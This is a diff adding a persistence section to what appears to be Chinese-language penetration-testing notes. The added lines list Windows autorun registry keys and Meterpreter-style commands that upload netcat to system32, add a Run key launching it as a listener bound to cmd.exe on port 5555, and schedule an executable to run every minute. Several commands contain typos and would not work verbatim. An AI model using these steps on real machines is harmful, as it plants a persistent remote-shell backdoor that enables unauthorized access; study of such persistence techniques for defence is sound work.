@@ -232,3 +232,32 @@ python3 w13scan.py -s 127.0.0.1 --html   # 会监听7778
 ```
 
 ## 存在目录时，返回403响应码
+
+# 进行权限维持
+开机自启动
+每次启动登录时都会按顺序自动执行.
+```bash
+HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
+HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run
+HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run
+HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run
+```
+- 上传nc
+
+upload nc.exe C:\\windows\\system32
+
+- 查看自启动注册表项I
+
+reg enumkey-k HKLM\\software\\microsoft\\windows\\currentversion\\un
+
+- 添加注册表,开机启动nc并开启监听
+
+reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v nc-d 'C:\\windows\\system32\\nc64.exe-Ldp 5555-e cmd.exe'
+
+- 查看注册表指定项值
+
+reg queryval -k HKLM\\software\\microsoft\\windows\\currentversion\\Run -v nc
+
+- 计划任务
+
+`schtasks /create /sc MINUTE /mo 1 /tr C:\Users\Administrator\Desktop\mx\5555.exe /tn test`
